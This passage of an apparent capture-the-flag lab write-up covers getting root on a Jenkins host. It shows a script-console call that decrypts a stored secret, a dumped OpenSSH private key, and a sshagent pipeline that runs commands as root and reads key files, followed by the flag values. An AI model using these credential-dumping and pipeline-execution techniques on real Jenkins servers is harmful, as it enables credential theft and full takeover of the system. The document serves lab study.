println( hudson.util.Secret.decrypt("{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}") )
```
```text
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### Pipeline SSH RCE
- This [post](https://www.jenkins.io/doc/pipeline/steps/ssh-agent/) shows how to use the `ssh` agent plugin via the pipeline
- We can create a new pipeline and fill the skeleton provided
```text
node {
  sshagent (credentials: ['deploy-dev']) {
    sh 'ssh -o StrictHostKeyChecking=no -l cloudbees 192.168.1.106 uname -a'
  }
}
```
- Given that when inspecting credentials in `Jenkins`, the root cred id is just `1`, we'll want to replace `deploy-dev` with `1` and `cloudbees` with `root` and the IP to `10.129.230.220` and we get code execution as `root`!
- We can change `uname -a` to `find /root` to enumerate the `root` directory, allowing us to find the path of the `ssh` key which we can then `cat` to see in the console output

### Pipeline Dump Credentials
- This [post](https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials) goes into excellent detail on how to dump credentials with `Jenkins`
- Essentially, we can authenticate with an `ssh` keyfile and immediate `cat ${keyfile}` like so
![[Pasted image 20260225225354.png]]
- We then see the `ssh` file in the console output

```sh
❯ ssh -i root.key root@10.129.8.175   
...
root@builder:~# cat /root/root.txt 
4dbfe572eb1701d19d0255ae193c287c
root@builder:~# cat /home/jennifer/user.txt
9018694066357208d5dfb01533127eae
```

